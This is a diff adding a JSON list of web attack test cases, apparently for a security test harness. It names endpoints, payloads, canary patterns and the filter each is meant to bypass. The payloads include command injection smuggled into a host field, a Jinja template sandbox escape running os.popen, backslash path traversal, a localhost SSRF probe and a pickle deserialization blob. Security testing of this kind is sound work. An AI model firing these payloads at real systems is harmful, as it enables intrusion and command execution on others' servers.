@@ -1,0 +1,62 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVGQAAAAAAAC5dq1KCX19idWlsdGluX19xAFsKcQFdcQJScQMu"
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "minimal pickle opcode (empty list) to test if pickle_disabled check is bypassable via malformed base64"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1;id#"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "semicolon command separator (not in block_patterns regex)"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\tid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "tab character (horizontal whitespace, not blocked by \\r\\n filter)"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "direct localhost IP (not in allowed_hosts but may bypass scheme+host check order)"
+  },
+  {
+    "id": "dyn_path_2",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "..\\..\\..\\tmp\\path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "backslash path traversal (Windows-style, may bypass Unix .. check)"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "sandbox escape via config object chain (bypasses _ prefix block via __class__)"
+  }
+]
